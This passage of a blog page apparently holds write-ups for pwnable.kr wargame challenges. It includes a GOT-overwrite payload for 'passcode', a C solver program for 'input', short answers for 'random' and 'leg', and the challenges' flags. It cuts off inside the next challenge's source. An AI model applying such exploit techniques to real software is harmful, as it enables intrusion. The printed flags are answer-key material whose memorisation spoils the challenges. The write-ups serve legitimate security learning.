href="#solve-3" class="headerlink" title="solve"></a>solve</h2><pre><code>UPX...? sounds like a delivery service :)</code></pre><h1 id="5-passcode"><a href="#5-passcode" class="headerlink" title="5.passcode"></a>5.passcode</h1><p>use name to change the address of printf to system.</p><pre class="line-numbers language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">96</span><span class="token operator">+</span><span class="token string">'\x00\xa0\x04\x08'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span><span class="token number">0x80485e3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag</p><pre><code>Sorry mom.. I got confused about scanf usage :(</code></pre><h1 id="6-random"><a href="#6-random" class="headerlink" title="6.random"></a>6.random</h1><p>not real random ,it always 1804289383.</p><h2 id="solve-4"><a href="#solve-4" class="headerlink" title="solve"></a>solve</h2><pre><code>3039230856</code></pre><p>flag</p><pre><code>Mommy, I thought libc random is unpredictable...</code></pre><h1 id="7-input"><a href="#7-input" class="headerlink" title="7.input"></a>7.input</h1><h2 id="sourcecode"><a href="#sourcecode" class="headerlink" title="sourcecode"></a>sourcecode</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// argv</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// stdio</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// env</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// file</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// network</span>  <span class="token keyword">int</span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>  <span class="token keyword">struct</span> sockaddr_in saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>  sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>  saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>  saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>saddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr_in<span class="token punctuation">)</span><span class="token punctuation">;</span>  cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// here's your flag</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-5"><a href="#solve-5" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span> </span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;netinet/in.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* stage 1 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/home/input2/input"</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">;</span>    argv<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"9999"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//server port</span>    argv<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* stage 3 */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* stage 4 */</span>  <span class="token comment" spellcheck="true">// ! : file open before execve , or the check will fail </span>    FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// wb,w are similar in linux but differ in win</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span>                         <span class="token comment" spellcheck="true">//see \x0d\x0a in win and \x0a in linux</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Cannot open file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open file success.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* stage 2 */</span>    <span class="token keyword">int</span> pipe_stdin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> pipe_stderr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    pid_t pid_child<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">pipe</span><span class="token punctuation">(</span>pipe_stdin<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">pipe</span><span class="token punctuation">(</span>pipe_stderr<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Cannot create the pipe."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token macro property">#<span class="token directive keyword">define</span> STDIN_READ   pipe_stdin[0]</span>    <span class="token macro property">#<span class="token directive keyword">define</span> STDIN_WRITE  pipe_stdin[1]</span>    <span class="token macro property">#<span class="token directive keyword">define</span> STDERR_READ  pipe_stderr[0]</span>    <span class="token macro property">#<span class="token directive keyword">define</span> STDERR_WRITE pipe_stderr[1]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> pid_child <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// do not forget the ()!</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Cannot create fork child."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> pid_child <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*child proc*/</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//wait to pipe link 0,2</span>        <span class="token function">close</span><span class="token punctuation">(</span>STDIN_READ<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>STDERR_READ<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span>STDIN_WRITE<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span>STDERR_WRITE<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/*parent proc*/</span>        <span class="token function">close</span><span class="token punctuation">(</span>STDIN_WRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>STDERR_WRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dup2</span><span class="token punctuation">(</span>STDIN_READ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//dup to 0-stdin</span>        <span class="token function">dup2</span><span class="token punctuation">(</span>STDERR_READ<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//dup to 2-stderr</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"start execve input.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/home/input2/input"</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Fail to execute the program"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pipe link.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* stage 5 */</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// wait the server start</span>    <span class="token keyword">int</span> sockfd<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// buf to be sent</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// len of avail buf</span>    <span class="token keyword">struct</span> sockaddr_in servaddr<span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>      servaddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// port in argv['C'] </span>    servaddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//local</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>sockfd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>PF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>          <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"socket error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"connect error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket connect.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">send</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>ln -s /home/input2/flag flaggcc 1.c -g./a.out</code></pre><p>flag</p><pre><code>Mommy! I learned how to pass various input in Linux :)</code></pre><h1 id="8-leg"><a href="#8-leg" class="headerlink" title="8.leg"></a>8.leg</h1><h2 id="solve-6"><a href="#solve-6" class="headerlink" title="solve"></a>solve</h2><pre><code>key1=0x8cdc+8key2=0x8d04+4key3=0x8d80</code></pre><p>flag</p><pre><code>My daddy has a lot of ARMv5te muscle!</code></pre><h1 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9.mistake"></a>9.mistake</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive 